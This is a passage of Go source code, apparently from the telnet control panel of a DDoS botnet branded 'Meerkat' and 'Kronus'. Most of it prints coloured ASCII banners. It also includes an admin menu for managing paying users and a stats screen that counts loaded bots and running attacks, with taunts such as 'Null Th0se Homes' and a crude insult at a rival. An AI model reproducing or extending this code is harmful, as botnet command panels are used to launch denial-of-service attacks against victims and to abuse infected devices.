            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠿⠛⠛⠛⠛⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠿⣿⣿⣿⣿⣿⡿⠻⣿⠿⢋⡀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣥⣤⡀⠙⠠⢶⡿⠟⠋⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣯⡲⠄⠀⠀⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠂⠀⠒⠒⠒⠲⠦⠤⣀⡀⠀⠀⠀⠀⠀⢀⣀⣠⡤⠤⠤⣀⣀⡀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⢀⣠⣬⣭⣍⣙⢶⣄⠉⠀⠀⠀⠀⠈⢉⡤⠖⢒⣒⡀⠀⠀⠈⠉⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⢘⣿⡝⢷⡌⠀⠀⠀⠀⠀⠀⢠⣶⠟⠛⠛⡟⠻⣶⣤⠤⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠰⣾⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⢀⣼⡷⠀⠈⠛⠄⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢄⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⢴⠆⠀⠀⠀⠀⠀⠉⠐⠒⠒⠊⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n")) 
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣯  \033[1;49;32m⣹⣯⣿⣒⣒⣒⣒⣒⣲⣶⠶⠶⣤⣤⢴⣦\033[1;49;35m ⠤⢤⢤⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  \033[1;49;32m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[1;49;35m ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n")) 
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿                   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\r\n"))                           
			continue
        }
		   if cmd == "MEERKAT" || cmd == "meerkat" {
       this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗                                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║                                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║                                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║                                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║                                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝                                                                                      \r\n"))
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                      
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗                                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝                                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗                                                                                \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝                                                                                \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗                                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝                                                                              \r\n")) 
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                       
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗███████╗                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝██╔════╝                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗  █████╗                                                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝  ██╔══╝                                                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗███████╗                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝╚══════╝                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m                                                                                                  \r\n"))
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                       
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗███████╗██████╗                                                               \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝██╔════╝██╔══██╗                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗  █████╗  ██████╔╝                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝  ██╔══╝  ██╔══██╗                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗███████╗██║  ██║                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m                                                                                                  \r\n"))
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                       
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗███████╗██████╗ ██╗  ██╗                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝██╔════╝██╔══██╗██║ ██╔╝                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗  █████╗  ██████╔╝█████╔╝                                                       \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝  ██╔══╝  ██╔══██╗██╔═██╗                                                       \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗███████╗██║  ██║██║  ██╗                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m                                                                                                  \r\n"))
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                       
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗███████╗██████╗ ██╗  ██╗ █████╗                                               \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝██╔════╝██╔══██╗██║ ██╔╝██╔══██╗                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗  █████╗  ██████╔╝█████╔╝ ███████║                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝  ██╔══╝  ██╔══██╗██╔═██╗ ██╔══██║                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗███████╗██║  ██║██║  ██╗██║  ██║                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m                                                                                                  \r\n"))
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                       
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗███████╗██████╗ ██╗  ██╗ █████╗ ████████╗                                     \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝██╔════╝██╔══██╗██║ ██╔╝██╔══██╗╚══██╔══╝                                     \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗  █████╗  ██████╔╝█████╔╝ ███████║   ██║                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝  ██╔══╝  ██╔══██╗██╔═██╗ ██╔══██║   ██║                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗███████╗██║  ██║██║  ██╗██║  ██║   ██║                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m                                                                                                 \r\n"))
    this.conn.Write([]byte("\r\x1b[1;31m Welcome To \r\x1b[0;32mMeerkat \r\x1b[1;31mBotnet banner\r\n"))    
    this.conn.Write([]byte("\r\x1b[1;31m  Null Th0se \r\x1b[0;35mHomes...\r\n"))
            continue
        } 
	 /*--------------------------------------------------------------------------------------------------------------------------------------------*/ 
     	if cmd == "beastmode" || cmd == "BEASTMODE" {
    this.conn.Write([]byte("\033[2J\033[1H")) 
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\x1b[1;31m ██████╗ ███████╗ █████╗ ███████╗████████╗\033[01;97m ███╗   ███╗ ██████╗ ██████╗ ███████╗\033[01;97m\r\n"))
    this.conn.Write([]byte("\x1b[1;31m ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝\033[01;97m ████╗ ████║██╔═══██╗██╔══██╗██╔════╝\033[01;97m\r\n"))
    this.conn.Write([]byte("\x1b[1;31m ██████╔╝█████╗  ███████║███████╗   ██║   \033[01;97m ██╔████╔██║██║   ██║██║  ██║█████╗\033[01;97m\r\n"))
    this.conn.Write([]byte("\x1b[1;31m ██╔══██╗██╔══╝  ██╔══██║╚════██║   ██║   \033[01;97m ██║╚██╔╝██║██║   ██║██║  ██║██╔══╝\033[01;97m\r\n"))
    this.conn.Write([]byte("\x1b[1;31m ██████╔╝███████╗██║  ██║███████║   ██║   \033[01;97m ██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗\033[01;97m\r\n"))
    this.conn.Write([]byte("\x1b[1;31m ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   \033[01;97m ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝\033[01;97m\r\n"))
    this.conn.Write([]byte("\x1b[1;31m                                                                               \033[01;97m\r\n"))
    this.conn.Write([]byte("\033[01;97m[\x1b[1;31m+\033[01;97m]  Welcome back \033[1;31m" + username + "  \033[01;97m[\x1b[1;31m+\033[01;97m]\r\n"))
    this.conn.Write([]byte("\033[01;97m[\x1b[1;31m+\033[01;97m]  Type \x1b[1;31mHELP \033[01;97mOr \x1b[1;31m?\033[01;97m To Get Started On BeastMode [\x1b[1;31m+\033[01;97m]\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))			  
			            continue
        }		  
		 /*--------------------------------------------------------------------------------------------------------------------------------------------*/ 	  
			  if userInfo.admin == 1 && cmd == "admin" {
            this.conn.Write([]byte("\033[01;35m ╔═══════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[01;35m ║ \033[38;5;93mADDBASIC - \033[01;37mAdd Basic Client Menu  \033[01;35m║\r\n"))
            this.conn.Write([]byte("\033[01;35m ║ \033[38;5;93mADDADMIN - \033[01;37mAdd Admin Client Menu  \033[01;35m║ \r\n"))
            this.conn.Write([]byte("\033[01;35m ║ \033[38;5;93mREMOVEUSER - \033[01;37mRemove User Menu     \033[01;35m║ \r\n"))
			this.conn.Write([]byte("\033[01;35m ╚═══════════════════════════════════╝  \r\n"))
            continue
        }
         /*--------------------------------------------------------------------------------------------------------------------------------------------*/ 
		if err != nil || cmd == "STATS" || cmd == "stats" {
        botCount = clientList.Count()
            this.conn.Write([]byte(fmt.Sprintf("\033[01;35m ╔═══════════════════════════════  \033[0m\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;35m ║ \033[01;37mLogged In As: \033[1;31m" + username + "          \033[0m\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;35m ║ \033[01;37mDemon Slayers Loaded: \033[1;31m%d                        \033[0m\r\n", botCount)))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;35m ║ \033[01;37mVersion: \033[01;35mKronus Beta \033[1;31m2.9                \033[0m\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;35m ║ \033[01;37mTotal Attacks\033[1;31m %d \033[0m\r\n", database.fetchAttacks()))) 
            fmt.Fprintln(this.conn,"\033[01;35m ║ \033[01;37mTotal Users: \033[1;31m"+fmt.Sprint(database.getTotalUsers())+"\033[0m\r")
		    fmt.Fprintln(this.conn,"\033[01;35m ║ \033[01;37mTotal Attacks Running: \033[1;31m"+fmt.Sprint(database.getTotalAttacksRunning())+"\033[0m\r")
			this.conn.Write([]byte(fmt.Sprintf("\033[01;35m ║ \033[01;37mSlayers Online [ \033[1;31m%d\033[0m ]\033[0m\r\n", len(sessions))))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;35m ╚═══════════════════════════════  \033[0m\r\n")))
            continue
        }
        
		botCount = userInfo.maxBots      
		 /*--------------------------------------------------------------------------------------------------------------------------------------------*/ 			 
					 if err != nil || cmd == "hoho" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[1;31m\r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m        \033[1;31m  888    888  \033[1;36m        \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m        \033[1;31m  888    888  \033[1;36m        \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m        \033[1;31m  888    888  \033[1;36m        \r\n"))
            this.conn.Write([]byte("\033[1;31m             8888888888\033[1;36m  .d88b.\033[1;31m  8888888888  \033[1;36m.d88b.  \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m d88\"\"88b\033[1;31m 888    888\033[1;36m d88\"\"88b \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m 888  888\033[1;31m 888    888 \033[1;36m888  888 \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m Y88..88P\033[1;31m 888    888 \033[1;36mY88..88P \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m  \"Y88P\"\033[1;31m  888    888\033[1;36m  \"Y88P\"  \r\n"))
            this.conn.Write([]byte("\033[1;31m                    HoHo banner \r\n"))
            continue          
	    }		   		 
	 /*--------------------------------------------------------------------------------------------------------------------------------------------*/ 									 
										 if err != nil || cmd == "neko" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            this.conn.Write([]byte("\x1b[1;96m                 ███\x1b[0;95m╗   \x1b[0;96m██\x1b[0;95m╗\x1b[0;96m███████\x1b[0;95m╗\x1b[0;96m██\x1b[0;95m╗  \x1b[0;96m██\x1b[0;95m╗ \x1b[0;96m██████\x1b[0;95m╗     \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                 ████\x1b[0;95m╗  \x1b[0;96m██\x1b[0;95m║\x1b[0;96m██\x1b[0;95m╔════╝\x1b[0;96m██\x1b[0;95m║ \x1b[0;96m██\x1b[0;95m╔╝\x1b[0;96m██\x1b[0;95m╔═══\x1b[0;96m██\x1b[0;95m╗    \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                 ██\x1b[0;95m╔\x1b[0;96m██\x1b[0;95m╗ \x1b[0;96m██\x1b[0;95m║\x1b[0;96m█████\x1b[0;95m╗  \x1b[0;96m█████\x1b[0;95m╔╝ \x1b[0;96m██\x1b[0;95m║   \x1b[0;96m██\x1b[0;95m║    \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                 ██\x1b[0;95m║╚\x1b[0;96m██\x1b[0;95m╗\x1b[0;96m██\x1b[0;95m║\x1b[0;96m██\x1b[0;95m╔══╝  \x1b[0;96m██\x1b[0;95m╔═\x1b[0;96m██\x1b[0;95m╗ \x1b[0;96m██\x1b[0;95m║   \x1b[0;96m██\x1b[0;95m║    \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                 ██\x1b[0;95m║ ╚\x1b[0;96m████\x1b[0;95m║\x1b[0;96m███████\x1b[0;95m╗\x1b[0;96m██\x1b[0;95m║  \x1b[0;96m██\x1b[0;95m╗╚\x1b[0;96m██████\x1b[0;95m╔╝    \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;95m                 ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝     \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                                              \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;95m                           NEKO SOME DOG SHIT LMFAO                         \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                                               \r\n\x1b[0m"))
            continue
        }       
	 /*--------------------------------------------------------------------------------------------------------------------------------------------*/ 			
						if err != nil || cmd == "sao" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\t\033[37m     .---.    \t                            \t\033[37m       .---.    \r\n"))
            this.conn.Write([]byte("\t\033[37m     |---|    \t                            \t\033[37m       |---|    \r\n"))
            this.conn.Write([]byte("\t\033[37m     |---|    \t                            \t\033[37m       |---|    \r\n"))
            this.conn.Write([]byte("\t\033[37m     |---|    \t                            \t\033[37m       |---|    \r\n"))
            this.conn.Write([]byte("\t\033[37m .---^ - ^---.\t                            \t\033[37m   .---^ - ^---.\r\n"))
            this.conn.Write([]byte("\t\033[37m :___________:\t                            \t\033[37m   :___________:\r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[36m  ██████  ▄▄▄       \033[1;49;35m▒\033[36m█████  \t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[1;49;35m▒\033[36m██    \033[1;49;35m▒ ▒\033[36m████▄    \033[1;49;35m▒\033[36m██\033[1;49;35m▒  \033[36m██\033[1;49;35m▒\t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[1;49;35m░ ▓\033[36m██▄  \033[1;49;35m ▒\033[36m██  ▀█▄  \033[1;49;35m▒\033[36m██\033[1;49;35m░  \033[36m██\033[1;49;35m▒\t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[1;49;35m  ▒\033[36m   ██\033[1;49;35m▒░\033[36m██▄▄▄▄██ \033[1;49;35m▒\033[36m██   ██\033[1;49;35m░\t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[1;49;35m▒\033[36m██████\033[1;49;35m▒▒ ▓\033[36m█   \033[1;49;35m▓\033[36m██\033[1;49;35m▒░ \033[36m████\033[1;49;35m▓▒░\t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[1;49;35m▒ ▒▓▒ ▒ ░ ▒▒   ▓▒\033[36m█\033[1;49;35m░░ ▒░▒░▒░ \t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |.-|   \t\033[1;49;35m░ ░▒  ░ ░  ▒   ▒▒ ░  ░ ▒ ▒░ \t\033[37m      |  |.-|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |.-'**|   \t\033[1;49;35m░  ░  ░    ░   ▒   ░ ░ ░ ▒  \t\033[37m      |.-'**|   \r\n"))
            this.conn.Write([]byte("\t\033[37m     \\***/    \t\033[1;49;35m      ░        ░  ░    ░ ░  \t\033[37m       \\***/    \r\n"))
